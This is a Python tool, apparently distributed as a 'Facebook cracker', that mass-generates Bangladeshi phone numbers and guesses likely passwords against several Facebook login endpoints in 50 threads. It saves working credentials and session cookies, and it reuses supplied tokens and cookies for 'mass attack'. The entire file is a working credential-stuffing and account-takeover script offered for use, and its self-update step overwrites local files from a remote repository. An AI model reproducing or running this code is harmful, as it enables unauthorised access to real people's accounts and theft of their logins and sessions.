"""
----------------------------------------------------------------------------
~/ ULTIMATE FB CRACKER 2025 PRO MAX
~/ DEVELOPED BY K14M-69
~/ VERSION: 3.0.0 (FULLY UPDATED)
~/ LAST UPDATE: 25 JULY 2025
----------------------------------------------------------------------------
"""

#__________/-IMPORT MODULES-\__________#
import os
import sys
import time
import random
import requests
import uuid
import re
import json
import string
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

#__________/-COLOR CODES-\__________#
class Colors:
    RED = "\033[1;91m"
    GREEN = "\033[1;92m"
    YELLOW = "\033[1;93m"
    BLUE = "\033[1;94m"
    PURPLE = "\033[1;95m"
    CYAN = "\033[1;96m"
    WHITE = "\033[1;97m"
    RESET = "\033[0m"

#__________/-TOOL CONFIGURATION-\__________#
class Config:
    TOKEN_FILE = "token.txt"
    COOKIE_FILE = "cookie.txt"
    PROXY_FILE = "proxy.txt"
    USER_AGENTS = [
        "Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1"
    ]
    API_KEYS = [
        "882a8490361da98702bf97a021ddc14d",
        "3e7c78e35a76a9299309885393b02d97",
        "5d8a86b6b5b29e0e7a0a5a8f5d8b6b5"
    ]

#__________/-TOOL LOGO-\__________#
def show_logo():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{Colors.RED}
     ▗▄▄▄▖▗▄▄▄▖▗▄▄▄   ▗▄▄▖▗▄▄▄▖▗▄▄▄▖▗▄▄▄▖
{Colors.WHITE}     ▐▌     █  ▐▌  █ ▐▌     █  ▐▌     █  
{Colors.WHITE}     ▐▛▀▀▘  █  ▐▌  █ ▐▌▝▜▌  █  ▐▛▀▀▘  █  
{Colors.RED}     ▐▙▄▄▖▗▄█▄▖▐▙▄▄▀ ▝▚▄▞▘▗▄█▄▖▐▌     █ {Colors.WHITE}V{Colors.RED}/{Colors.WHITE}2025
{Colors.GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Colors.CYAN}>> DEVELOPER {Colors.WHITE}: {Colors.GREEN}K14M-69
{Colors.CYAN}>> FEATURE  {Colors.WHITE}: {Colors.YELLOW}AUTO-CRACK {Colors.WHITE}〤 {Colors.YELLOW}MASS-ATTACK {Colors.WHITE}〤 {Colors.YELLOW}OLD-CLONING
{Colors.CYAN}>> STATUS   {Colors.WHITE}: {Colors.GREEN}PREMIUM {Colors.WHITE}〤 {Colors.GREEN}ACTIVE
{Colors.GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}""")

#__________/-MAIN CLASS-\__________#
class FBCracker:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []
        self.methods = {
            "1": {"name": "API METHOD", "func": self.api_method},
            "2": {"name": "GRAPH METHOD", "func": self.graph_method},
            "3": {"name": "AUTO-PRO METHOD", "func": self.auto_method},
            "4": {"name": "MASS ATTACK", "func": self.mass_attack},
            "5": {"name": "OLD CLONING", "func": self.old_cloning}
        }
    
    #__________/-CLEAR SCREEN-\__________#
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        show_logo()
    
    #__________/-DIVIDER LINE-\__________#
    def divider(self):
        print(f"{Colors.GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}")
    
    #__________/-MAIN MENU-\__________#
    def main_menu(self):
        self.clear_screen()
        print(f"{Colors.CYAN}[1] RANDOM CRACKING")
        print(f"{Colors.CYAN}[2] AUTO CRACKING (URADHURA ID)")
        print(f"{Colors.CYAN}[3] MASS ATTACK (TOKEN/COOKIE)")
        print(f"{Colors.CYAN}[4] OLD CLONING METHOD")
        print(f"{Colors.CYAN}[5] SETTINGS")
        print(f"{Colors.RED}[0] EXIT TOOLS")
        self.divider()
        
        choice = input(f"{Colors.YELLOW}>> SELECT OPTION {Colors.CYAN}: {Colors.RESET}")
        if choice == "1": self.random_cracking()
        elif choice == "2": self.auto_cracking()
        elif choice == "3": self.mass_attack_menu()
        elif choice == "4": self.old_cloning_menu()
        elif choice == "5": self.settings_menu()
        elif choice == "0": sys.exit(f"\n{Colors.GREEN}>> Thanks for using! {Colors.RESET}")
        else: self.main_menu()
    
    #__________/-RANDOM CRACKING-\__________#
    def random_cracking(self):
        self.clear_screen()
        print(f"{Colors.CYAN}>> EXAMPLE {Colors.WHITE}: 016 {Colors.RED}/{Colors.WHITE} 017 {Colors.RED}/{Colors.WHITE} 018 {Colors.RED}/{Colors.WHITE} 019")
        self.divider()
        code = input(f"{Colors.YELLOW}>> INPUT CODE {Colors.CYAN}: {Colors.RESET}").strip()
        
        self.clear_screen()
        print(f"{Colors.CYAN}>> EXAMPLE {Colors.WHITE}: 5000 {Colors.RED}/{Colors.WHITE} 10000 {Colors.RED}/{Colors.WHITE} 20000")
        self.divider()
        limit = int(input(f"{Colors.YELLOW}>> INPUT LIMIT {Colors.CYAN}: {Colors.RESET}"))
        
        self.clear_screen()
        for num, method in self.methods.items():
            print(f"{Colors.CYAN}[{num}] {method['name']}")
        self.divider()
        method_choice = input(f"{Colors.YELLOW}>> SELECT METHOD {Colors.CYAN}: {Colors.RESET}")
        
        if method_choice not in self.methods:
            print(f"{Colors.RED}>> Invalid method choice!{Colors.RESET}")
            time.sleep(1)
            return self.random_cracking()
        
        # Generate numbers
        self.gen = [code + ''.join(random.choice(string.digits) for _ in range(8)) for _ in range(limit)]
        
        # Start cracking
        self.start_cracking(method_choice)
    
    #__________/-AUTO CRACKING-\__________#
    def auto_cracking(self):
        self.clear_screen()
        print(f"{Colors.CYAN}>> THIS METHOD WILL AUTO CRACK URADHURA ID")
        print(f"{Colors.CYAN}>> IT WILL GENERATE RANDOM NUMBERS AND TRY")
        self.divider()
        limit = int(input(f"{Colors.YELLOW}>> INPUT LIMIT {Colors.CYAN}: {Colors.RESET}"))
        
        # Generate random Bangladeshi numbers
        prefixes = ['016', '017', '018', '019', '013', '014', '015']
        self.gen = [random.choice(prefixes) + ''.join(random.choice(string.digits) for _ in range(8)) for _ in range(limit)]
        
        # Start with auto-pro method
        self.start_cracking("3")
    
    #__________/-OLD CLONING MENU-\__________#
    def old_cloning_menu(self):
        self.clear_screen()
        print(f"{Colors.CYAN}>> THIS IS SPECIAL METHOD FOR OLD ACCOUNTS")
        print(f"{Colors.CYAN}>> IT USES SPECIAL ALGORITHM FOR OLD IDS")
        self.divider()
        code = input(f"{Colors.YELLOW}>> INPUT CODE {Colors.CYAN}: {Colors.RESET}").strip()
        
        self.clear_screen()
        print(f"{Colors.CYAN}>> EXAMPLE {Colors.WHITE}: 5000 {Colors.RED}/{Colors.WHITE} 10000 {Colors.RED}/{Colors.WHITE} 20000")
        self.divider()
        limit = int(input(f"{Colors.YELLOW}>> INPUT LIMIT {Colors.CYAN}: {Colors.RESET}"))
        
        # Generate old style numbers
        self.gen = [code + ''.join(random.choice(string.digits) for _ in range(8)) for _ in range(limit)]
        
        # Start old cloning
        self.start_cracking("5")
    
    #__________/-MASS ATTACK MENU-\__________#
    def mass_attack_menu(self):
        self.clear_screen()
        print(f"{Colors.CYAN}>> THIS METHOD USES TOKEN/COOKIE FOR MASS ATTACK")
        self.divider()
        
        # Check if token or cookie exists
        if not os.path.exists(Config.TOKEN_FILE) and not os.path.exists(Config.COOKIE_FILE):
            print(f"{Colors.RED}>> NO TOKEN OR COOKIE FOUND! ADD THEM IN SETTINGS{Colors.RESET}")
            time.sleep(2)
            return self.main_menu()
        
        targets = input(f"{Colors.YELLOW}>> ENTER TARGET NUMBERS (COMMA SEPARATED) {Colors.CYAN}: {Colors.RESET}").split(',')
        targets = [t.strip() for t in targets if t.strip()]
        
        if not targets:
            print(f"{Colors.RED}>> NO TARGETS PROVIDED!{Colors.RESET}")
            time.sleep(1)
            return self.mass_attack_menu()
        
        self.gen = targets
        self.start_cracking("4")
    
    #__________/-SETTINGS MENU-\__________#
    def settings_menu(self):
        self.clear_screen()
        print(f"{Colors.CYAN}[1] ADD TOKEN")
        print(f"{Colors.CYAN}[2] ADD COOKIE")
        print(f"{Colors.CYAN}[3] ADD PROXY")
        print(f"{Colors.CYAN}[4] CHECK UPDATES")
        print(f"{Colors.RED}[0] BACK TO MENU")
        self.divider()
        
        choice = input(f"{Colors.YELLOW}>> SELECT OPTION {Colors.CYAN}: {Colors.RESET}")
        
        if choice == "1":
            token = input(f"{Colors.YELLOW}>> ENTER FB TOKEN {Colors.CYAN}: {Colors.RESET}")
            with open(Config.TOKEN_FILE, "a") as f:
                f.write(token + "\n")
            print(f"{Colors.GREEN}>> TOKEN ADDED SUCCESSFULLY!{Colors.RESET}")
        elif choice == "2":
            cookie = input(f"{Colors.YELLOW}>> ENTER FB COOKIE {Colors.CYAN}: {Colors.RESET}")
            with open(Config.COOKIE_FILE, "a") as f:
                f.write(cookie + "\n")
            print(f"{Colors.GREEN}>> COOKIE ADDED SUCCESSFULLY!{Colors.RESET}")
        elif choice == "3":
            proxy = input(f"{Colors.YELLOW}>> ENTER PROXY (IP:PORT) {Colors.CYAN}: {Colors.RESET}")
            with open(Config.PROXY_FILE, "a") as f:
                f.write(proxy + "\n")
            print(f"{Colors.GREEN}>> PROXY ADDED SUCCESSFULLY!{Colors.RESET}")
        elif choice == "4":
            self.check_updates()
        elif choice == "0":
            return self.main_menu()
        else:
            print(f"{Colors.RED}>> INVALID OPTION!{Colors.RESET}")
        
        time.sleep(2)
        self.settings_menu()
    
    #__________/-CHECK UPDATES-\__________#
    def check_updates(self):
        self.clear_screen()
        print(f"{Colors.CYAN}>> CHECKING FOR UPDATES...{Colors.RESET}")
        try:
            update_url = "https://raw.githubusercontent.com/K14M-69/fb_cracker/main/version.txt"
            response = requests.get(update_url, timeout=10)
            
            if response.status_code == 200:
                latest_ver = response.text.strip()
                print(f"{Colors.CYAN}>> LATEST VERSION {Colors.WHITE}: {Colors.GREEN}{latest_ver}")
                print(f"{Colors.CYAN}>> CURRENT VERSION {Colors.WHITE}: {Colors.GREEN}3.0.0")
                self.divider()
                
                if latest_ver > "3.0.0":
                    print(f"{Colors.GREEN}>> NEW UPDATE AVAILABLE!{Colors.RESET}")
                    update = input(f"{Colors.YELLOW}>> UPDATE NOW? (Y/N) {Colors.CYAN}: {Colors.RESET}").lower()
                    if update == "y":
                        os.system("git clone https://github.com/K14M-69/fb_cracker.git update")
                        os.system("cd update && cp -r * .. && cd .. && rm -rf update")
                        print(f"{Colors.GREEN}>> UPDATE SUCCESSFUL! PLEASE RESTART TOOL{Colors.RESET}")
                        sys.exit()
                else:
                    print(f"{Colors.GREEN}>> YOU HAVE THE LATEST VERSION!{Colors.RESET}")
            else:
                print(f"{Colors.RED}>> UPDATE CHECK FAILED!{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}>> UPDATE ERROR: {str(e)}{Colors.RESET}")
        
        input(f"{Colors.YELLOW}>> PRESS ENTER TO CONTINUE {Colors.RESET}")
        self.settings_menu()
    
    #__________/-START CRACKING-\__________#
    def start_cracking(self, method_choice):
        self.clear_screen()
        method = self.methods[method_choice]
        print(f"{Colors.CYAN}>> MODE    {Colors.WHITE}: {Colors.YELLOW}{method['name']}")
        print(f"{Colors.CYAN}>> TOTAL   {Colors.WHITE}: {Colors.YELLOW}{len(self.gen)}")
        print(f"{Colors.CYAN}>> STATUS  {Colors.WHITE}: {Colors.GREEN}RUNNING...")
        self.divider()
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            for uid in self.gen:
                passlist = self.generate_passwords(uid, method_choice == "5")
                executor.submit(method['func'], uid, passlist)
        
        self.show_results()
    
    #__________/-GENERATE PASSWORDS-\__________#
    def generate_passwords(self, uid, is_old=False):
        num = uid[3:] if len(uid) > 8 else uid
        passlist = []
        
        if is_old:
            # Special patterns for old accounts
            passlist.extend([
                uid, num, 
                num[:4] + "123", num[:4] + "1234",
                num[:3] + "123", num[:3] + "1234",
                num[:2] + "1234", num[:2] + "12345",
                "123456", "1234567", "12345678",
                "112233", "11223344", "123123",
                num + "123", num + "1234",
                "fb" + num, "facebook" + num,
                num[:4] + num[:4], num[:3] + num[:3]
            ])
        else:
            # Modern password patterns
            passlist.extend([
                uid, num, num[:8], num[:7], num[:6],
                num[1:], num[2:], num[::-1],
                num[:4] + num[4:], num[:4] + "1234",
                num[:4] + "1122", "12345678", "11223344",
                "password", "facebook", num[:2]*4,
                num[2:4] + num[4:6] + num[6:]
            ])
        
        return passlist
    
    #__________/-API METHOD-\__________#
    def api_method(self, uid, passlist):
        self.update_console("API", uid)
        
        for pwd in passlist:
            try:
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': uid,
                    'password': pwd,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_US',
                    'client_country_code': 'US',
                    'fb_api_req_friendly_name': 'authenticate',
                    'api_key': random.choice(Config.API_KEYS),
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                }
                
                headers = {
                    'User-Agent': random.choice(Config.USER_AGENTS),
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'close',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com'
                }
                
                response = requests.post(
                    "https://api.facebook.com/auth/login",
                    data=data,
                    headers=headers,
                    timeout=30
                )
                result = response.json()
                
                if "session_key" in result:
                    cookies = ";".join(f"{c['name']}={c['value']}" for c in result.get("session_cookies", []))
                    self.save_result(uid, pwd, cookies, "API-OK.txt")
                    return True
                elif 'www.facebook.com' in result.get('error', {}).get('message', ''):
                    self.save_cp(uid, pwd, "API-CP.txt")
                    return True
                
            except Exception as e:
                continue
        
        self.loop += 1
        return False
    
    #__________/-GRAPH METHOD-\__________#
    def graph_method(self, uid, passlist):
        self.update_console("GRAPH", uid)
        
        for pwd in passlist:
            try:
                params = {
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'email': uid,
                    'password': pwd,
                    'method': 'post'
                }
                
                response = requests.get(
                    "https://graph.facebook.com/oauth/access_token",
                    params=params,
                    timeout=30
                )
                result = response.json()
                
                if "access_token" in result:
                    self.save_result(uid, pwd, result['access_token'], "GRAPH-OK.txt")
                    return True
                elif "error" in result:
                    self.save_cp(uid, pwd, "GRAPH-CP.txt")
                    return True
                
            except Exception as e:
                continue
        
        self.loop += 1
        return False
    
    #__________/-AUTO PRO METHOD-\__________#
    def auto_method(self, uid, passlist):
        self.update_console("AUTO", uid)
        
        for pwd in passlist:
            # Try mobile API first
            if self.try_mobile_api(uid, pwd):
                return True
            # Then try graph API
            if self.try_graph_api(uid, pwd):
                return True
            # Finally try token method if available
            if os.path.exists(Config.TOKEN_FILE):
                if self.try_token_method(uid, pwd):
                    return True
        
        self.loop += 1
        return False
    
    #__________/-MASS ATTACK METHOD-\__________#
    def mass_attack(self, uid, passlist):
        self.update_console("MASS", uid)
        
        for pwd in passlist:
            # Try token method first if available
            if os.path.exists(Config.TOKEN_FILE):
                if self.try_token_method(uid, pwd):
                    return True
            # Then try cookie method if available
            if os.path.exists(Config.COOKIE_FILE):
                if self.try_cookie_method(uid, pwd):
                    return True
            # Finally try mobile API
            if self.try_mobile_api(uid, pwd):
                return True
        
        self.loop += 1
        return False
    
    #__________/-OLD CLONING METHOD-\__________#
    def old_cloning(self, uid, passlist):
        self.update_console("OLD", uid)
        
        for pwd in passlist:
            try:
                data = {
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'email': uid,
                    'password': pwd,
                    'api_key': random.choice(Config.API_KEYS),
                    'credentials_type': 'password',
                    'format': 'JSON',
                    'sdk_version': '2',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'method': 'auth.login',
                    'locale': 'en_US',
                    'client_country_code': 'US'
                }
                
                headers = {
                    'User-Agent': 'Facebook 102.0',
                    'Accept-Language': 'en-US',
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
                
                response = requests.post(
                    "https://b-api.facebook.com/method/auth.login",
                    data=data,
                    headers=headers,
                    timeout=30
                )
                result = response.json()
                
                if "session_key" in result:
                    cookies = ";".join(f"{c['name']}={c['value']}" for c in result.get("session_cookies", []))
                    self.save_result(uid, pwd, cookies, "OLD-OK.txt")
                    return True
                elif 'www.facebook.com' in result.get('error', {}).get('message', ''):
                    self.save_cp(uid, pwd, "OLD-CP.txt")
                    return True
                
            except Exception as e:
                continue
        
        self.loop += 1
        return False
    
    #__________/-TRY MOBILE API-\__________#
    def try_mobile_api(self, uid, pwd):
        try:
            data = {
                'email': uid,
                'password': pwd,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'locale': 'en_US',
                'format': 'json'
            }
            
            response = requests.post(
                "https://api.facebook.com/method/auth.login",
                data=data,
                headers={'User-Agent': random.choice(Config.USER_AGENTS)},
                timeout=30
            )
            result = response.json()
            
            if "access_token" in result:
                self.save_result(uid, pwd, result.get('access_token', ''), "MOBILE-OK.txt")
                return True
            elif "error_msg" in result and "password" in result["error_msg"]:
                self.save_cp(uid, pwd, "MOBILE-CP.txt")
                return True
        except:
            return False
    
    #__________/-TRY GRAPH API-\__________#
    def try_graph_api(self, uid, pwd):
        try:
            params = {
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'email': uid,
                'password': pwd,
                'method': 'post'
            }
            
            response = requests.get(
                "https://graph.facebook.com/oauth/access_token",
                params=params,
                timeout=30
            )
            result = response.json()
            
            if "access_token" in result:
                self.save_result(uid, pwd, result['access_token'], "GRAPH-OK.txt")
                return True
            elif "error" in result:
                self.save_cp(uid, pwd, "GRAPH-CP.txt")
                return True
        except:
            return False
    
    #__________/-TRY TOKEN METHOD-\__________#
    def try_token_method(self, uid, pwd):
        try:
            with open(Config.TOKEN_FILE, "r") as f:
                tokens = [t.strip() for t in f.readlines() if t.strip()]
            
            for token in tokens:
                params = {
                    'access_token': token,
                    'email': uid,
                    'password': pwd,
                    'method': 'post'
                }
                
                response = requests.get(
                    "https://graph.facebook.com/oauth/access_token",
                    params=params,
                    timeout=30
                )
                result = response.json()
                
                if "access_token" in result:
                    self.save_result(uid, pwd, result['access_token'], "TOKEN-OK.txt")
                    return True
        except:
            return False
    
    #__________/-TRY COOKIE METHOD-\__________#
    def try_cookie_method(self, uid, pwd):
        try:
            with open(Config.COOKIE_FILE, "r") as f:
                cookies = [c.strip() for c in f.readlines() if c.strip()]
            
            for cookie in cookies:
                headers = {
                    'User-Agent': random.choice(Config.USER_AGENTS),
                    'Cookie': cookie,
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
                
                data = {
                    'email': uid,
                    'pass': pwd
                }
                
                response = requests.post(
                    "https://m.facebook.com/login.php",
                    data=data,
                    headers=headers,
                    allow_redirects=False,
                    timeout=30
                )
                
                if 'c_user' in response.headers.get('Set-Cookie', ''):
                    uid = re.search(r'c_user=(\d+)', response.headers['Set-Cookie']).group(1)
                    self.save_result(uid, pwd, cookie, "COOKIE-OK.txt")
                    return True
                elif 'checkpoint' in response.headers.get('Location', ''):
                    self.save_cp(uid, pwd, "COOKIE-CP.txt")
                    return True
        except:
            return False
    
    #__________/-SAVE RESULTS-\__________#
    def save_result(self, uid, pwd, auth, filename):
        print(f"\r{Colors.GREEN}>> OK {Colors.WHITE}- {Colors.CYAN}{uid} {Colors.WHITE}| {Colors.YELLOW}{pwd}")
        with open(filename, "a") as f:
            f.write(f"{uid}|{pwd}|{auth}\n")
        self.oks.append(uid)
    
    def save_cp(self, uid, pwd, filename):
        print(f"\r{Colors.BLUE}>> CP {Colors.WHITE}- {Colors.CYAN}{uid} {Colors.WHITE}| {Colors.YELLOW}{pwd}")
        with open(filename, "a") as f:
            f.write(f"{uid}|{pwd}\n")
        self.cps.append(uid)
    
    #__________/-UPDATE CONSOLE-\__________#
    def update_console(self, method, uid):
        colors = [Colors.RED, Colors.GREEN, Colors.BLUE, Colors.YELLOW, Colors.PURPLE]
        sys.stdout.write(
            f"\r{colors[self.loop % len(colors)]}>> {method} {Colors.WHITE}- "
            f"{Colors.CYAN}{self.loop} {Colors.WHITE}/ "
            f"{Colors.GREEN}{len(self.oks)} {Colors.WHITE}/ "
            f"{Colors.BLUE}{len(self.cps)} {Colors.WHITE}- "
            f"{Colors.YELLOW}{uid[:12]}..."
        )
        sys.stdout.flush()
    
    #__________/-SHOW RESULTS-\__________#
    def show_results(self):
        print('\n' + Colors.GREEN + "━" * 60 + Colors.RESET)
        print(f"{Colors.CYAN}>> PROCESS COMPLETED")
        print(f"{Colors.CYAN}>> TOTAL OK/CP {Colors.WHITE}: {Colors.GREEN}{len(self.oks)}{Colors.WHITE}/{Colors.BLUE}{len(self.cps)}")
        print(f"{Colors.CYAN}>> OK SAVED IN {Colors.WHITE}: {Colors.GREEN}*-OK.txt")
        print(f"{Colors.CYAN}>> CP SAVED IN {Colors.WHITE}: {Colors.BLUE}*-CP.txt")
        print(Colors.GREEN + "━" * 60 + Colors.RESET)
        input(f"{Colors.YELLOW}>> PRESS ENTER TO CONTINUE {Colors.RESET}")
        self.main_menu()

#__________/-MAIN FUNCTION-\__________#
if __name__ == "__main__":
    try:
        # Create necessary files if not exist
        for f in [Config.TOKEN_FILE, Config.COOKIE_FILE, Config.PROXY_FILE]:
            if not os.path.exists(f):
                open(f, "w").close()
        
        # Start the tool
        tool = FBCracker()
        tool.main_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}>> TOOL STOPPED BY USER{Colors.RESET}")
        sys.exit()